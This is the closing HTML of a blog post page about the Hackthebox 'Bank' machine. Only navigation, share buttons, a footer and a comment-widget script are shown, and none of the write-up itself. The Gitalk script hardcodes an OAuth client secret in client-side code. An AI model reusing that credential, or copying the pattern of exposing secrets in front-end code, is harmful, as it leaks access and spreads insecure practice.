        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&title=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Blocky - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/03/29/Hackthebox/Easy/Hackthebox-Granny/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Granny - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&title=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&title=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACt0lEQVR42u3a0WoCQQwFUP//py30qaCrN8mkIpx9krbuzpnCTrjJ7RZf99/r7+fHn7z+fHW35LmPTzx84eHh4bWWfnW9fszjI/O7XW3W623Nn4KHh4e3zevdOlniFT75eXIUvbHg4eHhfZR3tax8U6rldX4g4eHh4X0LrxoZJGU6Hh4e3rfw8vjg9bcmjLyMXsla8PDw8GJerwH22c/r/T08PDy8Vlc9uaqlebLo+6ELDw8Pb4NXLX+rhe9khCtps0VPx8PDw1vgnaL2At+8gJ6MLODh4eGd4uWv1GRZ1SGt3hhBYZQBDw8Pb42XNJbycyaJHiZFc2Hr8fDw8BZ4Z4ef8hK8d5/mRuDh4eEt8/IyN1nEpCDuxcG3XjqCh4eHd4iXNPXz++RbcOr4wcPDw9vg5aNU1dGrhNRrfeXfwsPDw9vj5eVpL1StFu6Tg+pJSo2Hh4d3lNcbk6qOGpwaIKg2xvDw8PA2eJP2VS8Crm5QdQ1PjgQ8PDy8o7y8kV9dRDW2qG5BIWLGw8PDW+OdbWJNQthq5PFmDXh4eHhHeXlUWn1wb2vylUQNPDw8PLw1Xm/UqRAHjKPhXjmOh4eH95+8XiM/PwZ6I1ajlAUPDw/vEC8qTFsFbl4u59uRH1R4eHh4e7ykLO6Vv73SvLehl5uLh4eHt8DLr/mxMRkauAdXHhDj4eHhTXj5UFSvXO4tNAlEov8bHh4e3gIviQl6jateNJysId9WPDw8vA1e7zWdv6yrmWqv0VUoqfHw8PDGvGoYkQe+k2GsPA7utd/w8PDw5rz56FXvMOjdrRxM4OHh4a3xtg+D6onU+/vLgwEPDw/vo7wc1muhzTd0dDDg4eHhHeX1IoP8t3nzrNAww8PDw1vj9caeJgHuxsDB5cGAh4eHd5R3Khqovugnce28ZMfDw8Nr8X4AmZVpzkcUZlcAAAAASUVORK5CYII=" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
